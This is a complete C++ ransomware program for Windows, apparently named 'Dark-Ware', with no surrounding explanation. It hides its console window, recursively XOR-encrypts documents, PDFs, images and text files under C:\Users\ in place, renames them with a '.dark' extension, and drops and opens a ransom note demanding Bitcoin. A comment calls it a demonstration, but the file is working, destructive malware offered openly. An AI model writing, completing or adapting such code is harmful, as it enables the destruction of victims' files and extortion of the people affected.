#include <windows.h>
#include <string>
#include <fstream>
#include <iostream>
#include <filesystem>

namespace fs = std::filesystem;

// Simplified encryption function (XOR-based for demonstration)
void encryptFile(const std::string& filepath, const std::string& key) {
    std::ifstream inFile(filepath, std::ios::binary);
    if (!inFile) {
        return;
    }

    // Read file content
    std::string content((std::istreambuf_iterator<char>(inFile)), std::istreambuf_iterator<char>());
    inFile.close();

    // Encrypt content with XOR
    for (size_t i = 0; i < content.size(); ++i) {
        content[i] ^= key[i % key.size()];
    }

    // Write encrypted content back
    std::ofstream outFile(filepath, std::ios::binary | std::ios::trunc);
    outFile.write(content.c_str(), content.size());
    outFile.close();

    // Append .dark extension to indicate encryption
    std::string newPath = filepath + ".dark";
    fs::rename(filepath, newPath);
}

void displayRansomNote() {
    std::string ransomNote = R"(
YOUR FILES HAVE BEEN ENCRYPTED BY DARK-WARE!
----------------------------------------
All your important files have been encrypted. To recover them, you must pay a ransom of 0.5 BTC to the following address:
1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa

After payment, send your transaction ID to darkware@malicious.com.
A decryption key will be provided to restore your files.

DO NOT attempt to decrypt files manually or delete this program. Doing so will result in permanent data loss.
)";

    std::string notePath = "C:\\Users\\Public\\RANSOM_NOTE.txt";
    std::ofstream noteFile(notePath);
    noteFile.write(ransomNote.c_str(), ransomNote.size());
    noteFile.close();

    // Open the ransom note in Notepad
    std::string command = "notepad.exe " + notePath;
    WinExec(command.c_str(), SW_SHOW);
}

void targetFiles() {
    std::string key = "darkwarekey123"; // Simple key for XOR encryption
    std::string targetDir = "C:\\Users\\";  // Target user directory for encryption

    for (const auto& entry : fs::recursive_directory_iterator(targetDir)) {
        if (entry.is_regular_file()) {
            std::string filepath = entry.path().string();
            // Encrypt common file types
            if (filepath.ends_with(".docx") || filepath.ends_with(".pdf") ||
                filepath.ends_with(".jpg") || filepath.ends_with(".txt")) {
                encryptFile(filepath, key);
            }
        }
    }
}

int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    targetFiles();
    displayRansomNote();
    return 0;
}
